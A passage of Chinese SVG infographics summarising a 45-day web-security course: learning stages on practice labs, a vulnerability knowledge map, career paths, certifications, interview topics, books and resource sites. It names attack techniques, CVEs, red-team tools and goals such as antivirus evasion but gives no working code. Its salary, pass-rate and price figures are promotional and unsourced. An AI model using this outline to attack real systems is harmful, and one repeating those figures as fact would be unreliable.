  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第一阶段(Day1-11) Web入门: HTTP基础 + DVWA入门8模块 打基础</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第二阶段(Day12-19) DVWA进阶: 7大高难度模块(XXE/Blind/CSP/JS/会话等)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第三阶段(Day20-25) SQL注入专项: SQLi-Labs 75关全覆盖 注入之王</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第四阶段(Day26-30) 文件上传/XSS专项: Upload-Labs 21关 + Pikachu XSS全类型</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第五阶段(Day31-36) 中级漏洞: XXE/SSRF/PHP反序列化/框架漏洞/Vulhub中级</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第六阶段(Day37-39) Java三大件入门: Shiro/Fastjson/Log4j2 + 中间件基础</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">第七阶段(Day40-45) Java高阶+综合: Fastjson/Shiro/Log4j2/Weclogic深度 + 综合方法论 + 毕业总结</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="g97nwwfi6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#g97nwwfi6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗺️ Web安全知识体系全景图(脑图式)</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【协议层】HTTP/HTTPS/TCP/IP / DNS / ARP / TLS握手 / CORS / SOP同源策略</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【Web基础】HTML/JS/CSS / Cookie/Session/JWT / Ajax / WebSocket / REST / SOAP</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【OWASP Top10 2021】A01失效访问控制/A02加密失效/A03注入/A04不安全设计/A05配置错误/A06缺陷组件/A07认证失败/A08软件完整性/A09日志监控失效/A10服务端请求伪造SSRF</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【注入类】SQLi(报错/盲注/堆叠/二次/宽字节) / NoSQL注入 / XXE / SSTI模板注入 / Xpath注入</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【客户端漏洞】XSS(反射/存储/DOM/Blind) / CSRF / CSP绕过 / JS前端逻辑漏洞 / Click劫持</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【服务端漏洞】文件上传(解析/竞争/.htaccess) / 包含(LFI/RFI/php://) / 文件删除/下载/遍历 / SSRF / RCE(代码执行/命令执行/反序列化)</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【认证与会话】弱口令/暴力破解/验证码绕过/JWT伪造/会话固定/Session劫持/OAuth越权</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【框架类漏洞】ThinkPHP/Struts2/SpringBoot/Laravel/Shiro/Fastjson/Log4j2/WordPress/Dedecms</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【中间件】Nginx/Apache解析/Tomcat PUT/IIS/WebLogic/JBoss/Redis未授权/MySQL UDF</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【内网与域渗透】端口转发/隧道(FRP/SSH)/SMB横向/NTLM Relay/域控(MS14-068/Zerologon)/MS17-010</text>
  <rect x="300" y="309" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【攻防】WAF绕过/IPS/IDS/EDR/SIEM监测/应急响应/溯源/红队评估/CTF夺旗</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="g6ryeet3y" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#g6ryeet3y)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏆 45天你已经掌握的核心能力 10项</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Web攻防体系全面认知: 从OWASP Top10到内网域控 全链路无死角 不再碎片化学习 ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 漏洞原理+实战 双重掌握: 每个漏洞都能讲清原理+手工复现+工具利用+修复方案 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ SQL注入之王: 手工+sqlmap 75关全覆盖 10种注入类型全部掌握 面试无压力 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Java三大件核弹级漏洞: Fastjson/Shiro/Log4j2 版本差异/JDK兼容/Bypass/加固 全掌握 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 中间件/框架漏洞: Weblogic/Tomcat/Nginx/IIS/Struts2/ThinkPHP 20+ CVE实战经验 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 综合攻防实战能力: 从信息收集→漏洞→提权→横向→报告 完整PTES流程 独立完成 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 内网渗透基础: 隧道/代理/凭据收集/横向移动/域内 打穿到核心服务器 ✓</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ 蓝队防守视角: 懂攻击更懂防御 WAF/RASP/加固/日志监测 修复建议可落地 ✓</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ 工具链熟练度: BurpSuite/Sqlmap/MSF/Nuclei/FRP/CS/Cobalt Strike 30+工具 高频使用 ✓</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ CTF/护网能力: 能独立参加CTF Web题 能在护网红队/蓝队承担至少一个专项任务 ✓</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gjjwkihcp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gjjwkihcp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 三大就业方向 详细路径</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【红队/渗透测试工程师】: 先考OSCP/CEH → 2年Web经验 → 内/域渗透 → 高级红队 → 红队负责人 年薪20W→80W 面试考点: SQLi原理/Fastjson绕过/Shiro链/提权/横向/域渗透</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【蓝队/SOC安全运营】: 先考CISSP/CISP → 1年EDR/SIEM/WAF经验 → 应急响应 → 蓝队负责人 → CISO 年薪20W→100W 考点: Windows事件/日志分析/IPS误报/溯源取证/APT样本</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【漏洞挖掘/安全研究员】: 先拿CNVD/CNNVD证书 挖CVE → 复现+0day挖掘 → 高级研究员 → 首席科学家 年薪30W→150W 考点: CVE复现报告/Java反序列化/PWN基础/二进制/Fuzz/AFL</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">💡 新手推荐: 红队入门最快(岗位多) → 中级转蓝队(稳定) → 高阶做研究(天花板高) 三条路径可互通</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g13hi2d3x" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g13hi2d3x)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏁 下一步学习路线：从入门→CTF→实战三级跃迁</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【入门巩固(第1-2月)】靶场二刷: DVWA/Pikachu/Sqli-labs二刷 + Upload-labs二刷 + 写每关详细WriteUp 目标: 独立通关 不看任何教程</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【CTF入段(第3-6月)】Web刷题: BUUCTF Web300题 + NSSCTF Web500题 + 参加各大高校校内赛 目标: CTF比赛 Web方向前10% 至少5个比赛证书</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【Pwn/Crypto入门(第7-12月)】 Pwn: 栈溢出/堆溢出/格式化字符串 入门题100道 Crypto: RSA/AES/古典密码 入门题100道 → 目标: CTF综合能力 全国排名前1000 进决赛圈</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【红队实战(第13-18月)】 Vulhub 200+漏洞全部通打一遍 + 护网实习/公司授权测试 + 拿CNVD/CNNVD通用证书至少30个 → 目标: OSCP证书 + 能独立做企业渗透测试项目</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【高级安全研究(第19-36月)】 APT样本分析 / 0day挖掘 / 红队武器化开发 / 内存马/免杀/RASP对抗 → 目标: 2个以上CVE 全球排名 + 大厂高级安全岗位 offer</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gyhppxzp8" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gyhppxzp8)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📜 十大必考安全证书 含金量排序</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① OSCP (Offensive Security) 红队天花板 / 纯手工24小时打靶机 全球公认 / 报名$999 过关率约30% 年薪加成+30W ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② CISP / CISP-PTE 国内渗透 / 必持 国企/网安招标必备 / 培训+考试 ¥9800 过关率约80% ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ CISSP 国际信息安全专家 / 蓝队CISO路线 / 年薪加成+40W / 5年工作经验门槛 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ CEH (道德黑客) EC-COUNCIL / 红队入门级 / 国际认可 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ Security+ CompTIA / 美国军方安全岗必考 / 入门级性价比高 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ OSWE 白盒代码审计 / 源码审计+Exploit开发 / 难度高 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ CKS / CKA Kubernetes安全 / 云原生安全方向 高薪 ✓</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ AWS Security Specialty / 云安全方向 未来趋势 ✓</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ eJPT (eLearnSecurity Junior) / 入门友好 新人第一证 ✓</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ CRTP / CRTO / 红队认证 / 域渗透/CS/MSF实战 红队进阶 ✓</text>
</svg>

<svg width="800" height="601" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 601">
  <defs><linearGradient id="gn4vph03g" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="601" rx="12" fill="url(#gn4vph03g)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试高频题 Top30 必背清单</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web1: SQL注入10种类型/防御方案 预编译为什么能防？</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web2: XSS三类型 防御 CSP绕过 10种 DOM XSS常见sink</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web3: CSRF原理 与XSS区别 Token为什么能防 SameSite Cookie</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web4: SSRF 6协议 云元数据 Redis攻击 gopher构造方法 防御方案</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web5: XXE OOB Blind php://filter 读取源码 防御 禁用DTD/外部实体</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web6: 文件上传 21关 解析漏洞 .htaccess .user.ini 竞争上传 防御</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Web7: SSRF vs CSRF vs RCE vs LFI 四个漏洞核心区别？</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java1: Fastjson 1.2.24/1.2.47/1.2.68 版本差异 JNDI链 SafeMode</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java2: Shiro-550/721原理 AES硬编码 Padding Oracle 加固5件套</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java3: Log4j2 44228/45046/45105/44832 修复版本链 JDK版本兼容</text>
  <rect x="300" y="309" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java4: CommonsCollections/Beanutils1/TemplatesImpl 3条链原理</text>
  <rect x="540" y="309" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Java5: Weblogic 14882/2725/2555/2109 四条利用链区别 加固9件套</text>
  <rect x="60" y="382" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">中间件: Nginx/Apache解析原理 IIS6 asp; IIS7 %00 Tomcat PUT 利用</text>
  <rect x="300" y="382" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">框架: ThinkPHP 5.x RCE 原理 Struts2 S2-045 OGNL注入 SpringBoot Actuator泄露</text>
  <rect x="540" y="382" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网: MS17-010/MS14-068/Zerologon/PTK/PTH 原理 横向方法</text>
  <rect x="60" y="455" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="487.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">运维: Jenkins未授权 Git泄露 内网Redis Docker unauth API 利用</text>
  <rect x="300" y="455" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="487.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">蓝队: WAF常见绕过 RASP原理 EDR检测 内存马检测方法 SIEM规则</text>
  <rect x="540" y="455" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="487.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CTF: SSTI Twig/Jinja2/FreeMarker 利用/绕过 条件竞争 PHP反序列化 phar:// POP链</text>
  <rect x="60" y="528" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="560.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">代码审计: RCE/SQLi/XXE/XSS/SSRF 危险函数 Top50 正则/数据流分析方法</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="grfhkvbf7" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#grfhkvbf7)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 必读书单 Top15 从入门到高阶</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【入门必看】①《Web安全深度剖析》②《白帽子讲Web安全》③《Web安全攻防: 渗透测试实战指南》</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【CTF入门】④《CTF特训营》⑤《CTF竞赛权威指南》⑥《Web安全深度实践: 从0到1》</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【代码审计】⑦《代码审计: 企业级Web代码安全架构》⑧《PHP安全之道》</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【Java安全】⑨《Java Web安全代码审计与实战案例》⑩《深入理解Java虚拟机》</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【内网/红队】⑪《内网安全攻防: 渗透测试实战指南》⑫《Metasploit权威指南》</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">【高阶/研究】⑬《漏洞战争: 软件漏洞分析精要》⑭《加密与解密》⑮《灰帽黑客》</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">💡 学习方法: 先读完第1/2/3本(3个月) → 做靶场 → 第4/5本CTF → 第11本内网 → 高阶书按需</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gx3fsvbps" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gx3fsvbps)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💻 学习资源站 收藏夹清单 12个</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">靶场: BUUCTF / NSSCTF / XCTF攻防世界 / Vulfocus / Vulhub / HackTheBox / TryHackMe</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">视频: B站 搜索 "Web安全 零基础" / FreeBuf学院 / i春秋 / 安全客学院</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">工具下载: Github / 52pojie / 吾爱破解 / Kali工具大全 / PenTestTools.cn</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">资讯文章: FreeBuf / 安全客 / 先知社区 / Paper Seebug / 嘶吼 / InfoQ安全</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">漏洞情报: CNVD / CNNVD / CVE Details / Exploit-DB / Packet Storm / Nuclei templates</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">面试题: 牛客网安全专区 / 安全面经 知乎 / GitHub Awesome-Security-Interview</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g79bgebqz" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g79bgebqz)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚡ 坚持的力量: 给零基础小白的5句话</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 没有天生的黑客 都是熬出来的: 第一天看不懂Burp没关系 第45天你已经会打Fastjson ✓</text>
